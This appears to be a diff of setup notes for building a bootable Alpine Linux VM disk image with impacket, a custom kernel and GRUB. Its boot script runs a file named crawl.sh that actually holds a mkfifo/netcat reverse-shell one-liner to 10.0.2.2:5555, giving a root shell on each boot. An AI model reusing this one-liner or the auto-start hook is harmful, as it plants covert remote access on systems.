@@ -1,0 +1,72 @@
+sudo docker run --name disk -it alpine:3.18 /bin/sh
+apk add openrc ntfs-3g python3 python3-dev py3-pip sqlite
+pip3 install impacket
+
+touch /etc/local.d/init.start
+chmod +x /etc/local.d/init.start
+vi /etc/local.d/init.start
+	#!/bin/sh
+
+	dmesg -n 1
+	mount -o remount,rw /
+	ifconfig lo 127.0.0.1 netmask 255.0.0.0
+
+	ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+	route add -net default gw 10.0.2.2
+	/root/crawl.sh
+	poweroff
+rc-update add local
+passwd root
+
+vi /root/crawl.sh
+  #!/bin/sh
+  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.2 5555 > /tmp/f
+chmod +x /root/crawl.sh
+
+
+
+
+
+sudo docker export disk > disk.tar
+truncate -s 200M disk.img
+fdisk disk.img
+ n p w
+sudo losetup -o $[2048*512] /dev/loop0 disk.img
+sudo mkfs.ext4 /dev/loop0
+sudo mount /dev/loop0 /media/iso
+cd /media/iso
+sudo tar xvf $OLDPWD/disk.tar
+sudo mkdir boot
+cd -
+
+cd /usr/src/linux-5.16.12
+sudo make defconfig
+sudo make menuconfig
+	File systems -> FUSE (Filesystem in Userspace) support [m]
+sudo make prepare
+sudo make scripts
+sudo make bzImage
+sudo make modules
+sudo make INSTALL_PATH=/media/iso/boot install
+sudo make INSTALL_MOD_PATH=/media/iso/ modules_install
+cd -
+
+sudo grub-install --target=i386-pc --boot-directory=/media/iso/boot/ disk.img --modules='part_msdos'
+cat <<E | sudo tee /media/iso/boot/grub/grub.cfg
+set timeout=0
+menuentry "Alpine Linux" {
+ linux /boot/vmlinuz-5.16.12 root=/dev/sda1 rw noapic
+ initrd /boot/initrd.img-5.16.12
+}
+E
+
+sudo chroot /media/iso /bin/sh
+echo nameserver 8.8.8.8 > /etc/resolv.conf
+apk add mkinitfs
+mkinitfs -k -o /boot/initrd.img-5.16.12 5.16.12
+apk del mkinitfs
+exit
+
+sudo umount /media/iso/
+sudo losetup -d /dev/loop0
+
